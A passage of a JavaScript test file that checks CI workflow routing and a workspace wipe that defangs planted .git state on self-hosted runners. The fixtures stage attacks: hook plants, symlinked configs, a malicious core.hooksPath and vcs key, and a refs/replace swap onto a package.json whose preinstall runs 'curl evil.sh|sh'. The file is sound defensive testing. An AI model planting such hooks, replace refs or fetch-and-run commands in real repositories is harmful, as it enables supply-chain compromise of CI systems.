      'write-access fork authors must render on the pool',
    );
    for (const assoc of ['CONTRIBUTOR', 'FIRST_TIME_CONTRIBUTOR', 'NONE', '']) {
      assert.deepEqual(
        evalRunsOn(visualsCaptureRunsOn, {
          ecsDisabled: false,
          eventName: 'pull_request',
          sameRepo: false,
          assoc,
        }),
        HOSTED_LABELS,
        `assoc '${assoc}' fork PRs must stay on ephemeral hosted runners`,
      );
    }
  });

  it('obeys the kill-switch', () => {
    assert.deepEqual(
      evalRunsOn(visualsCaptureRunsOn, {
        ecsDisabled: true,
        eventName: 'pull_request',
        sameRepo: true,
        assoc: 'OWNER',
      }),
      HOSTED_LABELS,
      'kill-switch must force the capture back to hosted',
    );
  });

  it('matches serve-ab routing byte for byte', () => {
    // One trust split, one edit site: a clause change on either side must
    // touch both or fail here.
    assert.equal(visualsCaptureRunsOn, String(serveAbDoc.jobs.ab['runs-on']));
  });

  it('clears stale capture dirs before any capture', () => {
    // On the persistent pool ${RUNNER_TEMP} outlives a run (see serve-ab.yml's
    // step of the same name): a leftover capture set from an earlier run would
    // be composited and uploaded as this run's preview, or silently become its
    // diff baseline. Unconditional — hosted runners get a fresh temp, so it is
    // a no-op there.
    const steps = visualsCaptureJob.steps;
    const clear = steps.findIndex((s) => s.name === 'Clear stale capture dirs');
    assert.ok(clear !== -1, 'the stale-capture clear must exist');
    assert.ok(
      !('if' in steps[clear]),
      'the clear must run on BOTH lanes, not only the pool',
    );
    assert.ok(
      !('continue-on-error' in steps[clear]),
      'a failed clear must fail the job, not publish a leaked preview',
    );
    assert.match(
      steps[clear].run,
      /rm -rf "\$\{RUNNER_TEMP\}\/web-shell-visuals" "\$\{RUNNER_TEMP\}\/web-shell-before"/,
      'the clear must remove BOTH the after and the before capture trees',
    );
    assert.match(
      steps[clear].run,
      /chmod -R u\+rwX "\$\{RUNNER_TEMP\}\/web-shell-visuals" "\$\{RUNNER_TEMP\}\/web-shell-before" 2>\/dev\/null \|\| true/,
      'a read-only leftover must be healed before the rm — the exact class this step clears wedges rm -rf with EACCES otherwise',
    );
    assert.match(
      steps[clear].run,
      /\|\| sudo -n rm -rf "\$\{RUNNER_TEMP\}\/web-shell-visuals" "\$\{RUNNER_TEMP\}\/web-shell-before"/,
      'a root-owned leftover falls back to the pool sudo allowlist, which includes rm',
    );
    const afterCapture = steps.findIndex((s) => s.id === 'after_capture');
    const beforeCapture = steps.findIndex(
      (s) => s.name === 'Capture before (base) screenshots',
    );
    assert.ok(
      afterCapture !== -1 && beforeCapture !== -1,
      'both capture steps must exist',
    );
    assert.ok(
      clear < afterCapture && clear < beforeCapture,
      'the clear must precede every capture that writes those trees',
    );
  });

  it('heals read-only capture-dir leftovers instead of wedging on them', () => {
    // A previous pool job leaving a read-only capture tree — the exact
    // class this step exists to clear — wedges step 1 of every later job:
    // rm -rf dies with EACCES descending into a 555 dir that still has
    // children, and the ownership heal only touches $GITHUB_WORKSPACE.
    const clear = visualsCaptureJob.steps.find(
      (s) => s.name === 'Clear stale capture dirs',
    );
    const bashPath = hostToolPath('bash');
    const root = mkdtempSync(join(tmpdir(), 'visuals-clear-readonly-'));
    try {
      const runnerTemp = join(root, 'runner-temp');
      for (const dir of ['web-shell-visuals', 'web-shell-before']) {
        const d = join(runnerTemp, dir);
        mkdirSync(join(d, 'junk'), { recursive: true });
        writeFileSync(join(d, 'junk', 'leftover.txt'), 'x\n');
        chmodSync(d, 0o555);
      }
      const res = spawnSync(
        bashPath,
        ['--noprofile', '--norc', '-eo', 'pipefail', '-c', clear.run],
        {
          encoding: 'utf8',
          env: { PATH: process.env.PATH, RUNNER_TEMP: runnerTemp },
        },
      );
      assert.equal(
        res.status,
        0,
        `the clear must heal read-only leftovers: ${res.stdout}${res.stderr}`,
      );
      for (const dir of ['web-shell-visuals', 'web-shell-before']) {
        assert.ok(
          !existsSync(join(runnerTemp, dir)),
          `${dir} must be fully removed after the heal`,
        );
      }
    } finally {
      for (const dir of ['web-shell-visuals', 'web-shell-before']) {
        const d = join(root, 'runner-temp', dir);
        if (existsSync(d)) {
          chmodSync(d, 0o755);
        }
      }
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('heals workspace ownership before the first checkout', () => {
    const steps = visualsCaptureJob.steps;
    const heal = steps.findIndex(
      (s) => s.name === 'Restore workspace ownership',
    );
    const checkout = steps.findIndex((s) =>
      String(s.uses || '').startsWith('actions/checkout'),
    );
    assert.ok(heal !== -1, 'the ownership heal must exist');
    assert.equal(steps[heal].if, "${{ runner.environment == 'self-hosted' }}");
    assert.match(steps[heal].run, /chown -R .* "\$GITHUB_WORKSPACE"/);
    assert.match(steps[heal].run, /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/);
    assert.ok(heal < checkout, 'the heal must precede the checkout');
  });

  it('wipes the reused workspace except the shared root .git before checking out PR code', () => {
    // The pool's per-repo workspace outlives a run, so the shared .git a
    // previous job left behind — including exec knobs planted in it (hooks,
    // core.hooksPath) — reaches this job's checkout unless the wipe defangs
    // it. This is the byte-identical port of serve-ab.yml's step; this pin
    // mirrors serve-ab's test of the same name line for line, so the two
    // copies drift only through a deliberate double edit.
    const steps = visualsCaptureJob.steps;
    const wipeIndex = steps.findIndex(
      (s) =>
        s.name ===
        'Wipe stale workspace except the shared .git before checkout',
    );
    assert.ok(
      wipeIndex !== -1,
      'self-hosted reuse must not bleed one PR into the next',
    );
    const wipe = steps[wipeIndex];
    assert.equal(wipe.if, "${{ runner.environment == 'self-hosted' }}");
    // The script text alone does not decide whether the wipe runs: the
    // shell wrapper, continue-on-error (step and job level), and env
    // overrides (BASH_ENV, PATH, GITHUB_WORKSPACE) — at step, job, and
    // workflow level — all control whether the pinned command executes
    // and whether its failure fails the job.
    const shell =
      wipe.shell ??
      visualsCaptureJob.defaults?.run?.shell ??
      visualsDoc.defaults?.run?.shell;
    assert.ok(
      shell === undefined || shell === 'bash',
      'the wipe must run under the default bash wrapper',
    );
    assert.ok(
      !('continue-on-error' in wipe),
      'a failed wipe must fail the job, not bleed into the next PR',
    );
    assert.ok(
      !('continue-on-error' in visualsCaptureJob),
      'a job-level continue-on-error would mask a failed wipe',
    );
    for (const envMap of [wipe.env, visualsCaptureJob.env, visualsDoc.env]) {
      assert.ok(
        !envMap ||
          (envMap.BASH_ENV === undefined &&
            envMap.PATH === undefined &&
            envMap.GITHUB_WORKSPACE === undefined),
        'BASH_ENV, PATH, or GITHUB_WORKSPACE can shadow the pinned wipe command',
      );
    }
    // The sudo-less wipe only works because ownership-restore ran first,
    // and it must precede the checkouts or it deletes the freshly
    // checked-out code instead of stale leftovers.
    const ownershipIndex = steps.findIndex(
      (s) => s.name === 'Restore workspace ownership',
    );
    assert.ok(
      ownershipIndex !== -1,
      'the wipe depends on the ownership-restore step existing',
    );
    assert.match(
      steps[ownershipIndex].run,
      /chown -R .* "\$GITHUB_WORKSPACE"/,
      'ownership-restore must actually chown the workspace',
    );
    assert.ok(
      ownershipIndex < wipeIndex,
      'the wipe depends on ownership-restore running first',
    );
    const checkouts = steps.filter((s) =>
      String(s.uses || '').startsWith('actions/checkout'),
    );
    for (const checkout of checkouts) {
      assert.ok(
        steps.indexOf(checkout) > wipeIndex,
        'the wipe must run before every checkout it protects',
      );
    }
    assert.ok(
      checkouts.length >= 2,
      'expected both the head and the merge-base checkout',
    );
    // Pin that the checkout-heal path guard is present and hands off to the
    // kept-.git tail, line by line, so any change forces a deliberate test
    // update — removing or demoting the wipe step must turn this red.
    assert.match(
      wipe.run,
      /refusing to wipe suspicious workspace path/,
      'the wipe must keep the checkout-heal path guard',
    );
    assert.match(
      wipe.run,
      /::error::refusing to wipe: an ancestor of the runner workspace is a symlink/,
      'the wipe must refuse a runner workspace planted under a symlinked ancestor — realpath would resolve through it and re-root every containment check at the link target',
    );
    assert.match(
      wipe.run,
      /::error::refusing to wipe relative runner workspace path/,
      'a relative runner workspace must fail closed BEFORE the ancestor walk — dirname -- "." outputs ".", so the walk would spin until timeout-minutes kills the job',
    );
    assert.match(
      wipe.run,
      /::warning::healing workspace path .*: it was a symlink/,
      'a symlinked intermediate component must be healed, not refused — a refusal removes nothing and wedges every later job reading the same env',
    );
    const executed = wipe.run
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l !== '' && !l.startsWith('#'));
    assert.equal(executed[0], 'set -uo pipefail');
    const tail = executed.slice(-28);
    assert.equal(
      tail[0],
      'find "$WS" -mindepth 1 -maxdepth 1 ! \\( -name \'.git\' -type d \\) -exec rm -rf {} +',
      'the wipe must keep only a REAL .git directory — a symlink or gitfile named .git can point outside the workspace — and only the guarded $WS may reach the rm',
    );
    assert.equal(
      tail[1],
      'if [ -d "$WS/.git" ]; then',
      'the wholesale validation guards on a real kept repo: a healed-empty workspace has no gitdir to sweep',
    );
    assert.equal(
      tail[2],
      'planted="$(find "$WS/.git" -type l | wc -l | tr -d \' \')"',
      'count the planted symlinks before naming anything — the names are bytes a previous job chose',
    );
    assert.equal(
      tail[3],
      'if [ "${planted}" != "0" ]; then',
      'report and sweep only when something was actually planted',
    );
    assert.equal(
      tail[4],
      'echo "::warning::removing ${planted} planted symlink(s) under ${WS}/.git"',
      'counted, not named: a newline in a planted name would forge a workflow annotation once printed',
    );
    assert.equal(
      tail[5],
      'find "$WS/.git" -type l -delete',
      'every symlink under the kept .git redirects a read or a write through an attacker-chosen target — sweep the class, link only, never following',
    );
    assert.equal(
      tail[6],
      'fi',
      'keep the sweep report an if-block: under -e a one-line && form fails the step when nothing is planted',
    );
    assert.equal(
      tail[7],
      'find "$WS/.git" -name \'*.lock\' -prune -exec rm -rf {} +',
      'every *.lock of any shape — a plant jams the defangs below or the next checkout; rm -rf takes directory-shaped plants too',
    );
    assert.equal(
      tail[8],
      'rm -rf "$WS/.git/objects/info/alternates"',
      'alternates poison the object store the next checkout materializes',
    );
    assert.equal(
      tail[9],
      'fi',
      'keep the wholesale sweep inside the kept-.git guard',
    );
    assert.equal(
      tail[10],
      'rm -rf "$WS/.git/commondir"',
      'the kept .git must lose commondir BEFORE any git call — a plant repoints hooks, config and refs to an attacker gitdir outside the workspace, and rm -rf takes a directory-shaped plant',
    );
    assert.equal(
      tail[11],
      'rm -rf "$WS/.git/hooks" "$WS/.git/info/attributes"',
      'the kept .git must lose its hooks and info/attributes exec vectors',
    );
    assert.equal(
      tail[12],
      'rm -rf "$(git --git-dir="$WS/.git" rev-parse --git-path config.worktree 2>/dev/null || echo /nonexistent)" 2>/dev/null || true',
      "extensions.worktreeConfig activates .git/config.worktree, a second local file that git config --local neither lists nor unsets — delete it like qwen-triage.yml's hardened config-sanitize",
    );
    assert.equal(
      tail[13],
      'git --git-dir="$WS/.git" config --local --unset-all extensions.worktreeConfig 2>/dev/null || true',
      'drop the extension that re-activates the split config file',
    );
    assert.equal(
      tail[14],
      '{ git --git-dir="$WS/.git" config --local --name-only --list 2>/dev/null || true; } | { grep -ivE \'^(core\\.(repositoryformatversion|bare|filemode|symlinks|ignorecase|precomposeunicode|logallrefupdates|hidedotfiles|protecthfs|protectntfs)|remote\\..+\\.(url|fetch|pushurl)|branch\\.|gc\\.|pack\\.|fetch\\.|index\\.|safe\\.|submodule\\.[^.]+\\.(url|active|branch))\' || true; } | while IFS= read -r key; do git --git-dir="$WS/.git" config --local --unset-all "$key" 2>/dev/null || true; done',
      "the kept .git config must be scrubbed to an allowlist that keeps NO extensions.* key — a planted extension makes every later git call exit 128 — remote narrowed to url/fetch/pushurl (any other remote key is a knob: vcs execs git-remote-<vcs> on the next fetch), core.worktree dropped (redirects the next checkout outside the workspace) — anchored to $WS/.git so a healed symlinked root never scrubs the link's target",
    );
    assert.equal(
      tail[15],
      'if [ -d "$WS/.git" ]; then',
      'the replace strip and its fail-open guard on a real kept repo: a healed-empty workspace has no refs to strip and must not fail the job here',
    );
    assert.equal(
      tail[16],
      'if ! replace_refs="$(git --git-dir="$WS/.git" for-each-ref --format=\'%(refname)\' refs/replace 2>/dev/null)"; then',
      'enumerate the replace refs; an unenumerable gitdir cannot be proven clean',
    );
    assert.equal(
      tail[17],
      'echo "::warning::removing kept .git whose refs cannot be enumerated: ${WS}/.git"',
      'the fail-open reports why the reuse is being paid back',
    );
    assert.equal(
      tail[18],
      'rm -rf "$WS/.git"',
      'fail open: remove the unprovable gitdir instead of carrying it — the next job re-fetches',
    );
    assert.equal(tail[19], 'else', 'an enumerable gitdir keeps the strip');
    assert.equal(
      tail[20],
      'printf \'%s\\n\' "${replace_refs}" | while IFS= read -r ref; do',
      "a planted refs/replace entry silently substitutes file content in the next job's checkout (actions/checkout passes no --no-replace-objects) — delete every one through git so packed entries drop too",
    );
    assert.equal(
      tail[21],
      'if [ -n "${ref}" ]; then',
      'an empty enumeration yields one empty line — the loop must skip it without failing the pipe',
    );
    assert.equal(
      tail[22],
      'git --git-dir="$WS/.git" update-ref -d "${ref}"',
      'delete each planted replace ref',
    );
    assert.equal(tail[23], 'fi', 'keep the empty-line skip an if-block');
    assert.equal(tail[24], 'done', 'close the strip loop');
    assert.equal(tail[25], 'fi', 'close the fail-open if/else');
    assert.equal(
      tail[26],
      'fi',
      'the strip and fail-open stay inside the kept-.git guard',
    );
    assert.equal(
      tail[27],
      'rm -rf "$WS/.git/refs/replace"',
      'and remove the namespace itself so nothing under it survives',
    );
  });

  // Exec witnesses for the kept-.git defang: each plants one of the states
  // a previous pool job can leave in the shared workspace (any pool lane
  // may have run attacker code), runs the REAL step under the runner's
  // shell flags, and asserts the next job would not execute the plant.
  // Removing any of the pinned defang lines must turn its witness red.
  const wipeStep = visualsCaptureJob.steps.find(
    (s) =>
      s.name === 'Wipe stale workspace except the shared .git before checkout',
  );

  it('keeps the wipe an executable-line-identical port of the serve-ab step', () => {
    // One defang, two call sites: the byte pins above hold each copy to
    // its own text, and this holds the two copies to each other, so a fix
    // on either side forces a deliberate double edit instead of a drift.
    const serveAbWipe = serveAbDoc.jobs.ab.steps.find(
      (s) =>
        s.name ===
        'Wipe stale workspace except the shared .git before checkout',
    );
    const executed = (run) =>
      run
        .split('\n')
        .map((l) => l.trim())
        .filter((l) => l !== '' && !l.startsWith('#'))
        .join('\n');
    assert.equal(
      executed(wipeStep.run),
      executed(serveAbWipe.run),
      'the visuals wipe must stay an executable-line-identical port of serve-ab.yml',
    );
  });

  it('strips a planted commondir before the next checkout can fire its hooks', () => {
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-commondir-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      const attacker = join(root, 'attacker');
      initProbeRepo(home, attacker);
      mkdirSync(join(attacker, '.git', 'hooks'), { recursive: true });
      const marker = join(root, 'hook-fired');
      writeFileSync(
        join(attacker, '.git', 'hooks', 'post-checkout'),
        `#!/bin/sh\ntouch '${marker}'\n`,
      );
      chmodSync(join(attacker, '.git', 'hooks', 'post-checkout'), 0o755);
      initProbeRepo(home, ws);
      writeFileSync(
        join(ws, '.git', 'commondir'),
        `${join(attacker, '.git')}\n`,
      );
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      assert.ok(
        !existsSync(join(ws, '.git', 'commondir')),
        'commondir must be removed',
      );
      // The next job's checkout must not fire the planted hook.
      const checkout = spawnSync(
        realGit,
        [
          '--git-dir',
          join(ws, '.git'),
          '--work-tree',
          ws,
          'checkout',
          '-q',
          '-f',
          'HEAD',
        ],
        { cwd: root, encoding: 'utf8', env: wipeGitEnv(home) },
      );
      assert.equal(checkout.status, 0, `checkout failed: ${checkout.stderr}`);
      assert.ok(
        !existsSync(marker),
        'the planted post-checkout hook must not fire',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('removes a planted config.lock so the scrub can unset exec keys', () => {
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-lock-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      const hooksDir = join(root, 'evil-hooks');
      mkdirSync(hooksDir);
      const marker = join(root, 'hook-fired');
      writeFileSync(
        join(hooksDir, 'post-checkout'),
        `#!/bin/sh\ntouch '${marker}'\n`,
      );
      chmodSync(join(hooksDir, 'post-checkout'), 0o755);
      gitProbe(home, ['config', '--local', 'core.hooksPath', hooksDir], ws);
      writeFileSync(join(ws, '.git', 'config.lock'), '');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      assert.ok(
        !existsSync(join(ws, '.git', 'config.lock')),
        'the planted lock must be removed',
      );
      const hooksPath = spawnSync(
        realGit,
        ['--git-dir', join(ws, '.git'), 'config', '--local', 'core.hooksPath'],
        { encoding: 'utf8', env: wipeGitEnv(home) },
      );
      assert.notEqual(
        hooksPath.status,
        0,
        'core.hooksPath must be scrubbed despite the planted lock',
      );
      const checkout = spawnSync(
        realGit,
        [
          '--git-dir',
          join(ws, '.git'),
          '--work-tree',
          ws,
          'checkout',
          '-q',
          '-f',
          'HEAD',
        ],
        { cwd: root, encoding: 'utf8', env: wipeGitEnv(home) },
      );
      assert.equal(checkout.status, 0, `checkout failed: ${checkout.stderr}`);
      assert.ok(
        !existsSync(marker),
        'the planted post-checkout hook must not fire',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('removes a symlinked .git/config before the defang dies on its target', () => {
    // git creates a plain .git/config, so a link there is state a previous
    // job chose. Unparseable target: every git defang dies on it and the
    // bare replace strip fails the step exit 128, wedging every later job
    // on this runner permanently. Parseable target outside the workspace:
    // the scrub's unset-all writes through the link, escaping the
    // containment this step exists to bound. Both arms: the wipe must
    // remove the link — never following it to the target — and complete.
    for (const parseable of [false, true]) {
      const arm = parseable ? 'parseable' : 'unparseable';
      const root = mkdtempSync(join(tmpdir(), `visuals-wipe-cfglink-${arm}-`));
      try {
        const home = join(root, 'home');
        mkdirSync(home);
        const rws = join(root, 'rws');
        const ws = join(rws, 'qwen-code');
        initProbeRepo(home, ws);
        // The target sits OUTSIDE the workspace (a pool's RUNNER_TEMP
        // outlives a run): nothing this step removes may reach it.
        const target = join(root, 'outside-config');
        const targetBytes = parseable
          ? '[core]\n\thooksPath = /evil-hooks\n'
          : 'not a git config line\n';
        writeFileSync(target, targetBytes);
        rmSync(join(ws, '.git', 'config'));
        symlinkSync(target, join(ws, '.git', 'config'));
        const res = runWipeStep(wipeStep.run, { home, ws, rws });
        assert.equal(
          res.status,
          0,
          `the wipe must survive a symlinked config (${arm}): ${res.stdout}${res.stderr}`,
        );
        assert.match(
          res.stdout,
          /removing 1 planted symlink\(s\) under .*\.git/,
          `the sweep must report the planted link before it is gone (${arm})`,
        );
        assert.ok(
          !existsSync(join(ws, '.git', 'config')),
          `the symlinked config must be removed (${arm})`,
        );
        assert.equal(
          readFileSync(target, 'utf8'),
          targetBytes,
          `the target outside the workspace must be untouched (${arm})`,
        );
        // The kept repo stays usable: the next checkout completes.
        const checkout = spawnSync(
          realGit,
          [
            '--git-dir',
            join(ws, '.git'),
            '--work-tree',
            ws,
            'checkout',
            '-q',
            '-f',
            'HEAD',
          ],
          { cwd: root, encoding: 'utf8', env: wipeGitEnv(home) },
        );
        assert.equal(
          checkout.status,
          0,
          `the next checkout must complete (${arm}): ${checkout.stderr}`,
        );
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    }
  });

  it('strips planted refs/replace, loose and packed, before the next checkout materializes them', () => {
    for (const packed of [false, true]) {
      const arm = packed ? 'packed' : 'loose';
      const root = mkdtempSync(join(tmpdir(), `visuals-wipe-replace-${arm}-`));
      try {
        const home = join(root, 'home');
        mkdirSync(home);
        const rws = join(root, 'rws');
        const ws = join(rws, 'qwen-code');
        initProbeRepo(home, ws);
        writeFileSync(join(ws, 'package.json'), '{"name":"clean"}\n');
        gitProbe(home, ['add', 'package.json'], ws);
        gitProbe(home, ['commit', '-q', '-m', 'clean'], ws);
        const cleanSha = gitProbe(home, ['rev-parse', 'HEAD'], ws);
        writeFileSync(
          join(ws, 'package.json'),
          '{"name":"EVIL","scripts":{"preinstall":"curl evil.sh|sh"}}\n',
        );
        gitProbe(home, ['add', 'package.json'], ws);
        gitProbe(home, ['commit', '-q', '-m', 'evil'], ws);
        const evilSha = gitProbe(home, ['rev-parse', 'HEAD'], ws);
        gitProbe(home, ['replace', cleanSha, evilSha], ws);
        if (packed) {
          gitProbe(home, ['pack-refs', '--all'], ws);
        }
        const res = runWipeStep(wipeStep.run, { home, ws, rws });
        assert.equal(
          res.status,
          0,
          `wipe failed (${arm}): ${res.stdout}${res.stderr}`,
        );
        const materialized = spawnSync(
          realGit,
          ['--git-dir', join(ws, '.git'), 'show', `${cleanSha}:package.json`],
          { encoding: 'utf8', env: wipeGitEnv(home) },
        );
        assert.equal(
          materialized.status,
          0,
          `show failed (${arm}): ${materialized.stderr}`,
        );
        assert.match(
          materialized.stdout,
          /"name":"clean"/,
          `the next checkout must materialize the clean content (${arm})`,
        );
        const remaining = spawnSync(
          realGit,
          ['--git-dir', join(ws, '.git'), 'for-each-ref', 'refs/replace'],
          { encoding: 'utf8', env: wipeGitEnv(home) },
        );
        assert.equal(
          remaining.stdout.trim(),
          '',
          `no replace ref may survive (${arm})`,
        );
        assert.ok(
          !existsSync(join(ws, '.git', 'refs', 'replace')),
          `the replace namespace dir must be gone (${arm})`,
        );
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    }
  });

  it('heals a runner-workspace root a previous job replaced with a symlink', () => {
    // Silent-wipe arm: the link's target holds the repo subdir, so every
    // containment check bounds the wipe to the TARGET — tautologically —
    // and the wipe quietly deletes files outside the real runner workspace.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-rootlink-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const work = join(root, 'work');
      mkdirSync(work);
      const evil = join(root, 'evil');
      mkdirSync(join(evil, 'qwen-code'), { recursive: true });
      writeFileSync(join(evil, 'qwen-code', 'victim.txt'), 'x\n');
      const rws = join(work, 'qwen-code');
      symlinkSync(evil, rws);
      const ws = join(rws, 'qwen-code');
      mkdirSync(ws, { recursive: true });
      writeFileSync(join(ws, 'stale.txt'), 'x\n');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(
        res.status,
        0,
        `the healed root must not wedge the wipe: ${res.stdout}${res.stderr}`,
      );
      assert.match(
        res.stdout,
        /healing runner workspace .*: it was a symlink/,
        'the root heal must report what it cleared',
      );
      assert.ok(
        !lstatSync(rws).isSymbolicLink() && statSync(rws).isDirectory(),
        'the root must heal to a real directory',
      );
      assert.ok(
        existsSync(join(evil, 'qwen-code', 'victim.txt')),
        'nothing outside the runner workspace may be wiped',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('resolves the permanent wedge a root symlink through a file leaves', () => {
    // Wedge arm: the link resolves through a regular file, so without the
    // root heal the workspace heal cannot recreate the workspace and every
    // later job on this runner dies on the plant, which the daemon never
    // repairs.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-rootfile-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const work = join(root, 'work');
      mkdirSync(work);
      writeFileSync(join(root, 'file-target'), 'not a directory\n');
      const rws = join(work, 'qwen-code');
      symlinkSync(join(root, 'file-target'), rws);
      const res = runWipeStep(wipeStep.run, {
        home,
        ws: join(rws, 'qwen-code'),
        rws,
      });
      assert.equal(
        res.status,
        0,
        `the root heal must clear the wedge: ${res.stdout}${res.stderr}`,
      );
      assert.ok(
        !lstatSync(rws).isSymbolicLink(),
        'the root must no longer be a symlink',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('refuses a wipe whose runner workspace sits under a planted ancestor symlink', () => {
    // A link ABOVE the runner workspace (e.g. the runner's _work dir)
    // re-roots realpath and every containment check: the root heal never
    // fires — the last component is a real directory — and the allowlist
    // matches tautologically on the re-rooted path, so without a refusal
    // the wipe silently deletes files outside the real workspace with
    // exit 0 and no annotation. Refuse instead of heal: unlinking an
    // ancestor the daemon relies on would strand every workspace under it.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-ancestor-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const realWork = join(root, 'real-work');
      const wsReal = join(realWork, 'qwen-code', 'qwen-code', 'qwen-code');
      mkdirSync(wsReal, { recursive: true });
      writeFileSync(join(wsReal, 'victim.txt'), 'x\n');
      writeFileSync(join(wsReal, 'stale.txt'), 'x\n');
      symlinkSync(realWork, join(root, 'work'));
      const rws = join(root, 'work', 'qwen-code', 'qwen-code');
      const ws = join(rws, 'qwen-code');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.notEqual(
        res.status,
        0,
        `a non-canonical runner workspace must fail the wipe closed: ${res.stdout}${res.stderr}`,
      );
      assert.match(
        res.stdout,
        /::error::refusing to wipe: an ancestor of the runner workspace is a symlink/,
        'the refusal must surface the planted ancestor',
      );
      assert.ok(
        existsSync(join(wsReal, 'victim.txt')) &&
          existsSync(join(wsReal, 'stale.txt')),
        'nothing outside the real runner workspace may be wiped',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('scrubs exec-key plants but keeps the fetch keys the next checkout reuses', () => {
    // The scrub is an allowlist, not a denylist of known knobs: vcs (the
    // next fetch execs git-remote-<vcs>) and core.worktree (redirects the
    // next checkout's writes outside the workspace) are scrubbed, while
    // url/fetch/pushurl — the keys actions/checkout reuses — survive.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-allowlist-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      const conf = (key, value) =>
        gitProbe(home, ['config', '--local', key, value], ws);
      conf('remote.origin.url', 'https://example.com/repo.git');
      conf('remote.origin.fetch', '+refs/heads/main:refs/remotes/origin/main');
      conf('remote.origin.pushurl', 'https://example.com/repo.git');
      conf('remote.origin.vcs', 'evilprobe');
      conf('core.worktree', join(root, 'outside'));
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      const local = gitProbe(
        home,
        [
          '--git-dir',
          join(ws, '.git'),
          'config',
          '--local',
          '--name-only',
          '--list',
        ],
        ws,
      ).split('\n');
      for (const kept of [
        'remote.origin.url',
        'remote.origin.fetch',
        'remote.origin.pushurl',
      ]) {
        assert.ok(local.includes(kept), `${kept} must survive the scrub`);
      }
      for (const scrubbed of ['remote.origin.vcs', 'core.worktree']) {
        assert.ok(!local.includes(scrubbed), `${scrubbed} must be scrubbed`);
      }
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('completes a wipe that kept no repo at all', () => {
    // The healed-empty and never-cloned shapes have no .git: the replace
    // strip must skip — a bare git call would fail the job over nothing
    // left to strip — and the wipe must still clear the leftovers.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-norepo-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      mkdirSync(ws, { recursive: true });
      writeFileSync(join(ws, 'leftover.txt'), 'x\n');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(
        res.status,
        0,
        `a repo-less wipe must still complete: ${res.stdout}${res.stderr}`,
      );
      assert.deepEqual(readdirSync(ws), []);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('refuses a relative runner workspace before the ancestor walk can spin', () => {
    // dirname -- "." outputs ".", and the walk terminates only at "/" or
    // the empty string — on a relative path it spins until
    // timeout-minutes kills the job, with no annotation. The refusal must
    // fire BEFORE the walk, not inside the heal branch a relative path
    // that resolves from the step's CWD skips. The spawn timeout in
    // runWipeStep turns the unfixed spin red here instead of hanging.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-relrws-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const res = runWipeStep(wipeStep.run, { home, ws: '.', rws: '.' });
      assert.notEqual(
        res.status,
        0,
        `a relative runner workspace must fail the wipe closed: ${res.stdout}${res.stderr}`,
      );
      assert.match(
        res.stdout,
        /::error::refusing to wipe relative runner workspace path/,
        'the refusal must surface instead of a silent hang',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('heals a symlinked intermediate component instead of refusing on it forever', () => {
    // A link one level ABOVE the workspace leaves the last component real
    // (through the link): the workspace heal never fires, the containment
    // check refuses, and the refusal removes nothing — every later job
    // reading the same env dies on the plant. Heal it: unlink the link
    // itself and recreate the tree it shadowed, never touching the link's
    // target outside the runner workspace.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-midlink-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const realWork = join(root, 'real-work');
      mkdirSync(join(realWork, 'qwen-code'), { recursive: true });
      writeFileSync(join(realWork, 'qwen-code', 'victim.txt'), 'x\n');
      const rws = join(root, 'rws');
      mkdirSync(rws);
      symlinkSync(realWork, join(rws, 'sub'));
      const ws = join(rws, 'sub', 'qwen-code');
      mkdirSync(ws, { recursive: true });
      writeFileSync(join(ws, 'stale.txt'), 'x\n');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(
        res.status,
        0,
        `the healed component must not wedge the wipe: ${res.stdout}${res.stderr}`,
      );
      assert.match(
        res.stdout,
        /healing workspace path .*: it was a symlink/,
        'the heal must report what it cleared',
      );
      assert.ok(
        !lstatSync(join(rws, 'sub')).isSymbolicLink(),
        'the plant must heal to a real directory',
      );
      assert.ok(
        existsSync(join(realWork, 'qwen-code', 'victim.txt')),
